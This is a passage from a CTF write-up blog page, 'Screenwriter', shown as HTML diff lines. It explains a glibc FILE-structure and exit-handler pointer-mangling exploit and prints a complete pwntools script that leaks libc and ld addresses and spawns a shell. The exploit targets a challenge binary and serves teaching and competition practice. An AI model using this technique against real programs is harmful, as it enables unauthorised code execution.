_codecvt: <span class="number">0x0</span></span><br><span class="line"> _wide_data: <span class="number">0x0</span></span><br><span class="line"> unknown2: <span class="number">0x0</span></span><br><span class="line"> vtable: <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Here you can see that this is the entirety of the file structure. We see that the <code>_IO_buf_base</code> and <code>_IO_buf_end</code> were set to <code>0xdeadbeef</code> and <code>0xdeadbf0f</code>(base+<code>0x20</code>) respectively. We can also notice that <code>fileno</code> was set to <code>0x0</code>, indicating that the file descriptor to read from will be stdin. This permits us to trigger a read from stdin to that given address for the given amount of bytes.</p>
+<p>So given that ability, we will first mangle the pointer we want to write, then write it to the exit handlers. And luckily for us the following address in memory actually turns out to be stored into the register <code>rdi</code> at the time the handler is called. This means we have the ability to call a function AND control <code>rdi</code>. This easily lets us call <code>system(&#39;/bin/sh&#39;)</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># writing system with /bin/sh to exit handler</span></span><br><span class="line">payload = p64(rol_64((libc.sym[<span class="string">&#x27;system&#x27;</span>] ^ key),<span class="number">0x11</span>))</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<p>Note that the <code>rdi</code> value did NOT need to be mangled.</p>
+<p>After submiting the overwrite, the next thing to do is call <code>exit()</code> and boom we have an interactive shell!</p>
+<h2 id="Full-Exploit-Script"><a href="#Full-Exploit-Script" class="headerlink" title="Full Exploit Script"></a>Full Exploit Script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">elf = context.binary = ELF(<span class="built_in">bin</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="built_in">bin</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b exit\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">struct_one = <span class="number">48</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr, pad=<span class="number">0</span></span>):</span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*struct_one</span><br><span class="line">    payload += p64(<span class="number">0x00000000fbad2488</span>)</span><br><span class="line">    payload += p64(addr) + p64(addr+<span class="number">0x50</span>) + p64(addr)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name:&#x27;</span>, payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;From the reference:\n&#x27;</span>)</span><br><span class="line">    leak = u64(p.recv(<span class="number">8</span>-pad) + <span class="string">b&#x27;\x00&#x27;</span>*pad)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror_64</span>(<span class="params">value, shift</span>):</span><br><span class="line">    shift %= <span class="number">64</span> </span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; shift) | (value &lt;&lt; (<span class="number">64</span> - shift))) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol_64</span>(<span class="params">value, shift</span>):</span><br><span class="line">    shift %= <span class="number">64</span> </span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; shift) | (value &gt;&gt; (<span class="number">64</span> - shift))) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># warm the structs</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;masterpiece:&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rebase libc</span></span><br><span class="line">puts = leak(elf.got[<span class="string">&#x27;puts&#x27;</span>], <span class="number">2</span>)</span><br><span class="line">libc.address = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the exit handler stuff (it leaks a pointer mangled that is a ld ptr)</span></span><br><span class="line">handler_target = libc.address + <span class="number">0x21af18</span></span><br><span class="line">handler_leak = leak(handler_target)</span><br><span class="line">log.info(<span class="built_in">hex</span>(handler_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaking ld</span></span><br><span class="line">linker_leak = leak(libc.address + <span class="number">0x219178</span>, <span class="number">2</span>) - <span class="number">0x17dd0</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(linker_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate mangle key</span></span><br><span class="line">leaked_value = linker_leak + <span class="number">0x6040</span></span><br><span class="line">key = ror_64(handler_leak, <span class="number">0x11</span>)^(leaked_value)</span><br><span class="line">log.info(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="comment"># use file structure to write to exit handler</span></span><br><span class="line">fp = FileStructure()</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*struct_one</span><br><span class="line">payload += fp.read(handler_target, <span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># writing system with /bin/sh to exit handler</span></span><br><span class="line">payload = p64(rol_64((libc.sym[<span class="string">&#x27;system&#x27;</span>] ^ key),<span class="number">0x11</span>))</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#wgmy&#123;2c2e996f00d41a8eb2d3016b6447aee9&#125;</span></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Screenwriter"><span class="toc-number">1.</span> <span class="toc-text">Screenwriter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">2.</span> <span class="toc-text">Reverse Engineering</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Full-Exploit-Script"><span class="toc-number">4.</span> <span class="toc-text">Full Exploit Script</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://anthony-js.info/writeups/screenwriter/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://anthony-js.info/writeups/screenwriter/&text=Screenwriter"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://anthony-js.info/writeups/screenwriter/&is_video=false&description=Screenwriter"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Screenwriter&body=Check out this article: http://anthony-js.info/writeups/screenwriter/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://anthony-js.info/writeups/screenwriter/&name=Screenwriter&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://anthony-js.info/writeups/screenwriter/&t=Screenwriter"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2003-2025
+    anthonyjs
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
